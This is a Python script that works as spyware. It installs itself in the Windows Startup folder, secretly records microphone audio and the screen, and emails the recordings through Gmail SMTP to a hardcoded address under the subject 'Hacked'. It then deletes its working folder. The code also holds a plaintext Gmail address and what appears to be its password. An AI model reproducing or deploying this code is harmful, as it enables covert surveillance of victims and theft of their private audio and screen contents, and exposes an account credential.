
from shutil import copyfile
import os, time, cv2, pyautogui
import threading, zipfile
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import shutil

try:
    copyfile('audio recorder mail.exe',
            'C://Users' + f'//{os.getlogin()}' + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//audio recorder mail.exe')
except:
    pass

pathack = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool'
try:
    os.mkdir(pathack)
except:
    pass

filename3 = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool//recording.mp3'
filename4 = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool//recording.mkv'
# filename = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool//hacked.zip'

# ============================================

duration = 10

def audiorec(duration):
    freq = 44100
    recording = sd.rec(int(duration * freq),
                    samplerate=freq, channels=2)

    sd.wait()
    wv.write(filename3, recording, freq, sampwidth=2)

# ======================================================

def screenrec(duration):
    resolution = (1920, 1080)

    codec = cv2.VideoWriter_fourcc(*"XVID")
    fps = 10.0
    out = cv2.VideoWriter(filename4, codec, fps, resolution)

    tic = time.perf_counter()
    while True:
        img = pyautogui.screenshot()
        frame = np.array(img)

        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

        toc = time.perf_counter()
        diff = toc-tic

        if diff > duration:
            break

    out.release()
    cv2.destroyAllWindows()

# ========================================

def hacked(filename):
    try:

        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders

        fromaddr = "imvickykumar999@gmail.com"
        toaddr = ["hellovickykumar123@gmail.com", fromaddr][1]

        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr

        msg['Subject'] = "Hacked"
        link = 'https://github.com/imvickykumar999/Screen-Recorder'
        body = f'''
        This E-Mail is Sent using python code using {link}
        '''
        msg.attach(MIMEText(body, 'plain'))
        attachment = open(filename, "rb")

        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        try:
            s.login(fromaddr, "@Hey_Vicks")
        except Exception as e:
            # print(e)
            pass

        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        # print('mailed', filename)
        s.quit()

    except Exception as e:
        time.sleep(2)
        # print(e)
        hacked(filename)

# =============================================

t1 = threading.Thread(target=screenrec, args=(duration,))
t2 = threading.Thread(target=audiorec, args=(duration,))

t1.start()
t2.start()

t1.join()
t2.join()

# ===================================================

# os.startfile(filename3)
# os.startfile(filename4)

# def zipdir(path, ziph):
#     for root, dirs, files in os.walk(path):
#         for file in files:
#             ziph.write(os.path.join(root, file))
#
# zipf = zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED)
# zipdir(pathack, zipf)
# zipf.close()

hacked(filename3)
hacked(filename4)

# hacked(filename)
shutil.rmtree(pathack)
